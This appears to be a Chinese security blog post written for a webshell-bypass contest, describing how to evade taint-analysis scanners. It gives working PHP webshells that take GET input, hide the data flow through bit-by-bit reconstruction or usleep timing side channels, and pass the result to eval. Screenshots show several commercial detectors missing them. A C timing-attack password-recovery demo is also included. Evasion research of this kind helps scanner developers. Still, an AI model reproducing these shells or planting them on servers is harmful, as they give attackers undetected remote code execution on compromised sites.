---
title: 'PHP-WebShell绕过污点分析'
date: 2022-02-10
permalink: /posts/2022/02/php-webshell/
tags:
  - cool posts
  - old posts
  - category2
---

## 前言

阿里的伏魔活动绕WebShell结束了，交了18个，重复了12个。。不得不说，太卷了哈哈哈。写一下两个自己感觉比较有意思的绕过思路。

## 污点分析

先谈谈什么是污点分析，这是一项非常老的技术。
污点分析是一种跟踪并且分析污点信息在程序中流动的技术。在漏洞分析的过程中，污点分析会将所有来自程序外部输入都标记成污点数据，然后跟踪和污点数据相关的信息流向，观察是否流向被定义好的sink点。

### 例子一
```php
#demo.php
<?php
    $a = $_GET['a'];// source点，通过GET输入的数据会标记成污点信息
	$b = base64_decode($a);//变量$b被$a污染了
	eval($b); // sink,污点$b传到了eval处。
?>
```
如何通过代码去检测说明这个流程呢？
使用php-parse成ast的例子，可以清晰的看到变量的由来和去处，以及传递覆盖的过程
```shell
❯ php .\demo.php
string(1166) "array(
    0: Stmt_Expression(
        expr: Expr_Assign(
            var: Expr_Variable(
                name: a //source
            )
            expr: Expr_ArrayDimFetch(
                var: Expr_Variable(
                    name: _GET
                )
                dim: Scalar_String(
                    value: a
                )
            )
        )
    )
    1: Stmt_Expression(
        expr: Expr_Assign(
            var: Expr_Variable(
                name: b
            )
            expr: Expr_FuncCall(
                name: Name(
                    parts: array(
                        0: base64_decode
                    )
                )
                args: array(
                    0: Arg(
                        name: null
                        value: Expr_Variable(
                            name: a //source
                        )
                        byRef: false
                        unpack: false
                    )
                )
            )
        )
    )
    2: Stmt_Expression(
        expr: Expr_Eval(
            expr: Expr_Variable(
                name: b //source
            )
        )
    )
    3: Stmt_Nop(
    )
)"
```
上面仅仅是一个简单的，抽象AST的例子，真正污点分析还需要做很多工程。

![image-20220210161709118](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210161709118.png)
譬如需要先**对PHP程序分词**，生成AST(抽象语法树)，**进而在AST的基础上进行PHP的语法和词法分析**，得到富有语义的IR中间代码，然后精确地字符串分析提取函数摘要，并创建CFG。其中函数摘要的准确性和CFG的完整性，保证了污点分析的准确性和效率。
污点分析阶段在前一阶段的基础上通过**变量回溯**的方法提取有效路径，将无关的路径“剪枝”，判断用户输入到达敏感点的路径上是否经过了有效的过滤，进而判断是否存在漏洞。


这些工作，需要对编译技术了解的十分透彻，而我的编程功底实在有限，无法自己写一个污点分析的最小化引擎。
## 绕过污点分析
上面知识我们知道，污点分析跟踪观察的是source到sink的这个途径，那么可不可以把这条路径给隐藏呢？
### AntiHybrid
这个技巧是读论文学到的，这是一篇Usenix顶刊论文，作者为release版本的软件尽可能的阻止攻击者进行Fuzzing，提高hacker fuzz的难度和成本，提出了三条Fuzzification 的技术：
​


1.  SpeedBump, which amplifies the slowdown in normal executions by hundreds of times to the fuzzed execution   在一些非预期的错误处理路径注入延迟原语，影响Fuzz执行速度 
1.  BranchTrap, interfering with feedback logic by hiding paths and polluting coverage maps。
插入大量对输入敏感的分支，使得Fuzz处理不得不浪费大量的资源处理这些无用的分支分析中 
1.  AntiHybrid, hindering taint-analysis and symbolic execution。
作者将原始程序中的explicit data-flow转换为implicit data-flow，以阻碍污染分析。 



下面重点介绍AntiHybrid的思路。


这是作者演讲的slide。为了抵抗dta，新建了一个anti_dta的变量，该变量根据source调节控制动态的赋值，借助于此，两个变量变得毫无关系，从而污点从input隐蔽转换到anti_data中。


![image-20220210162720966](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162720966.png)

下面是作者给出的antiHybrid的代码思路
![image-20220210162731792](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162731792.png)
其中6-15行是核心，12行是if条件控制，隐蔽的把数据传到了ch变量。因此我们把这个思想搬运到这次的比赛中，譬如以下。

```php
<?php

$temp = $_GET['a'];
$cha = $_GET['chr'];
$bbb = "";
for($i=0;$i < strlen($temp);$i++)
{
  $ch = 0;
  $temps = 0;
  $temps2 = 0;
  $kkkk = "1";
  for($j=0;$j < 8;$j++)
  {
    $temps = ord($temp[$i]);//source
    $temps2 = $temps & (1 << intval($j));
    if($temps2 != 0)//source
    {
      $ch |= 1 << $j;//source
    }
  }
  $bbb .= $cha($ch);//source
}
eval($bbb);
?>
```
### 侧信道
侧信道攻击——是一种利用计算机不经意间释放出的信息信号（如功耗,电磁辐射，电脑硬件运行声）来进行破译的攻击模式。我更愿意将它视为一种思想，如何利用借助环境信息来推导出你想要的信息。下面我将使用一个简单的C语言程序说明一下时间侧信道如何发生。
#### 时间侧信道
这个例子是当时学习SGX侧信道的例子，对侧信道感兴趣的小伙伴可以自己把余下几个侧信道给做了。其中包括如何利用Page fault、flush-and-reload等等方法来侧信道攻击获取信息。
[https://github.com/jovanbulck/sgx-tutorial-space18](https://github.com/jovanbulck/sgx-tutorial-space18)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cacheutils.h>
#include "secret.h"

#define NUM_SAMPLES     100000
#define DELAY           1

uint64_t diff[NUM_SAMPLES];
int user_len, secret_len;

char *read_from_user(void) //提供读写给用户
{
    char *buffer = NULL;
    int len; size_t size;

    printf("Enter super secret password ('q' to exit): ");
    if ((len=getline(&buffer, &size, stdin)) != -1)
    {
        buffer[len-1]='\0';
        printf("--> You entered: '%s'\n", buffer);
        return buffer;
    }
    else
    {
        printf("--> failure to read line\n");
        return NULL;
    }
}

void delay(void) //延迟函数，空白的for循环函数
{
    volatile int i;
    for (i=0; i<100;i++);
}

int check_pwd(char *user)//检测密钥是否正确
{//检查的方式
    int i;
    if (user_len != secret_len)//首先匹配长度是否一致
        return 0;
    delay();//延迟函数

    for (i=0; i < user_len; i++)//然后逐字检查
    {
        if (user[i] != SECRET_PWD[i])
            return 0;
        delay();//延迟函数
    }
    return 1;
}

int compare(const void * a, const void * b) {
   return ( *(uint64_t*)a - *(uint64_t*)b );
}

int main()
{
    char *pwd;
    int j, allowed = 0;
    uint64_t tsc1, tsc2, med;

    while ((pwd = read_from_user()) && strcmp(pwd, "q"))
    {
    	user_len = strlen(pwd);
    	secret_len = strlen(SECRET_PWD);
        for (j=0; j < NUM_SAMPLES; j++)//10000次循环比较
        {
            tsc1 = rdtsc_begin();//计时开始
            allowed = check_pwd(pwd);
            tsc2 = rdtsc_end();//结束计时
            diff[j] = tsc2 - tsc1;//将结果存入diff数组
        }

        if (allowed)
        {
            printf("< ACCESS ALLOWED >\n");
        }
        else
        {
            printf("< ACCESS DENIED >\n");
        }
        qsort(diff, NUM_SAMPLES, sizeof(uint64_t), compare);//将结果排序
        med = diff[NUM_SAMPLES/2];//输出众数
        printf("time (med clock cycles): %lu\n", med);

        free(pwd);

    }
    return 0;
}
```
首先来介绍一下rdtsc函数，rdtsc指令返回的是自开机始CPU的周期数，可以较为精准的测量时间。
值得一提的是，侧信道还有一个很难受的点就是误差，由于计算机执行单个测量时候可能发生上下文切换或者中断，导致单个测量值并不可信，因此需要取其平均数，demo中做了10000次的测量，取其众数
下面看看运行结果，如何猜测这个secert
```shell
pw0rld@pw0rld-code [11时34分52秒] -> % cat secret.h 
#ifndef SECRET_H_INC
#define SECRET_H_INC

#define SECRET_PWD      "524"//猜测的密钥是524
#define FR_SECRET       5

#endif
pw0rld@pw0rld-code [11时34分56秒] -> % ./a.out     
Enter super secret password ('q' to exit): 6 
--> You entered: '6'
< ACCESS DENIED >  //由于上面check的流程是先检测密码的长度，我们先确定密码的位数
time (med clock cycles): 84
Enter super secret password ('q' to exit): 54
--> You entered: '54'
< ACCESS DENIED >
time (med clock cycles): 84
Enter super secret password ('q' to exit): 123
--> You entered: '123'
< ACCESS DENIED >
time (med clock cycles): 457 //输入三位之后，明显的发现测量的time变大了
Enter super secret password ('q' to exit): 543
--> You entered: '543'
< ACCESS DENIED >
time (med clock cycles): 978  //由于check是逐个比较的，第一位比较失败就不会往下比较。因此确定第一位
Enter super secret password ('q' to exit): 542
--> You entered: '542'
< ACCESS DENIED >
time (med clock cycles): 978
Enter super secret password ('q' to exit): 515
--> You entered: '515'
< ACCESS DENIED >
time (med clock cycles): 976
Enter super secret password ('q' to exit): 521
--> You entered: '521'
< ACCESS DENIED >
time (med clock cycles): 1367  //确定第二位
Enter super secret password ('q' to exit): 522
--> You entered: '522'
< ACCESS DENIED >
time (med clock cycles): 1367
Enter super secret password ('q' to exit): 523
--> You entered: '523'
< ACCESS DENIED >
time (med clock cycles): 1367
Enter super secret password ('q' to exit): 524
--> You entered: '524'
< ACCESS ALLOWED >
time (med clock cycles): 1601  //确定答案
Enter super secret password ('q' to exit):
```
可以看到，通过时间的测量，我们可以把一个三位的密钥变成三个一位密钥，大大节省了尝试的时间。
那么大致了解了简单的侧信道知识。我们是不是可以利用这个侧信道思路恢复我们的输入。
#### microtime
所以，侧信道思路就是：传入的source参数可以拆分成acsii，然后使用microtime来延时相对应的ascii时间，然后测量这个时间，通过获取程序执行的时间来恢复参数，从而得到一份干净的数据，然后送去sink
```php
<?php 
$temp = $_GET['a']; //source 
$test = new SplQueue();
$time_stack = new SplQueue();

for($i=0;$i < strlen($temp);$i++)
{
    $test->enqueue(ord($temp[$i]));//获取ascii存入队列，source
}
while(1)
{
    if(($test->isEmpty()))//source
    {
        break;
    }
    
    $start = microtime(true);//干净的
    usleep(($test->dequeue())*20000);// ascii 1毫秒   source
    // $end = microtime(true); //干净的
    $end = microtime(true); //干净的

    $test->next();
    $timesta = ceil(($end - $start)*1000);//干净的
    $time_stack->enqueue(ceil(($timesta / 2) /10) - 1);//干净的
}
$hahh = "";
while(!($time_stack->isEmpty()))
{
    $caaaa = $time_stack->dequeue();
    $hahh .= chr($caaaa);
    $time_stack->next();
}

eval($hahh);
  ?>
```
值得注意的是，像我们之前说过，侧信道测量是会有误差的，所以这个sleep的时间必须多测几次，测出一个能恢复的延迟时间，在我Win本地以及Linux远程服务器，`usleep(($test->dequeue())*20000)`  这个是能恢复正确的ascii的，不排除存在极端情况无法恢复。
##### 测试情况
伏魔
![image-20220210162819275](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162819275.png)
河马查杀1.8.2
![image-20220210162833817](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162833817.png)
长亭牧云
![image-20220210162841721](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162841721.png)

#### 内存侧信道
除了时间侧信道外，我还研究了一下通过内存来进行侧信道恢复，我使用了memory_get_usage()和str_repeat()这两个函数来进行测量，但是php内存是补齐的，无法区分精确到各个参数命令。
```php
<?php
$acsii_array = array();

for($i = 33;$i<127;$i++ )
{
	$start =  memory_get_usage(); // 36640
	$a = str_repeat("b", $i);  //之间相差 32+$aa-1
	$ends =  memory_get_usage(); // 57960
	$k = $ends - $start - $i;
	$acsii_array[chr($i)] = $ends - $start;
	unset($a);
}
print_r("
<pre>");
print_r($acsii_array);
```


![image-20220210162857496](https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162857496.png)
## 最后
随着软件分析技术的发展，DevSecOps不断推进，污点追踪从学术圈搬到工业界，它也许是抵抗入侵的一道十分有力的防御。有了这么一层强有力的防御，也要求我们攻击者要思考如何针对新的防御方法来bypass，本文中绕过污点分析，就要想方设法来让引擎把污点弄丢，从而达到绕过的目的。

## 参考
* [ctf-all-in-one 污点分析](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.5_taint_analysis.html )
* [SAST, DAST, IAST and RASP](https://www.softwaresecured.com/what-do-sast-dast-iast-and-rasp-mean-to-developers/)
* [洞态](https://dongtai.io/ )
* [side-channel-tutorial](https://github.com/jovanbulck/sgx-tutorial-space18 )
* [Fuzzification: Anti-Fuzzing Techniques](https://www.usenix.org/conference/usenixsecurity19/presentation/jung)
* [pop-master](https://www.anquanke.com/post/id/264231#h2-1 )
* [ast-explorer ](https://astexplorer.net/ )
* [洋葱Webshell检测实践与思考](https://security.tencent.com/index.php/blog/msg/152 )
* [伏魔计划](https://www.yuque.com/azeus/01/bh1rgi?spm=0.0.0.0.6PHqmO )
* [如何使用AST生成程序的控制流图（CFG）](https://www.zhihu.com/question/27730062)
* [收集的GitHub相关项目](https://github.com/stars/pw0rld/lists/bypass-webshell)​
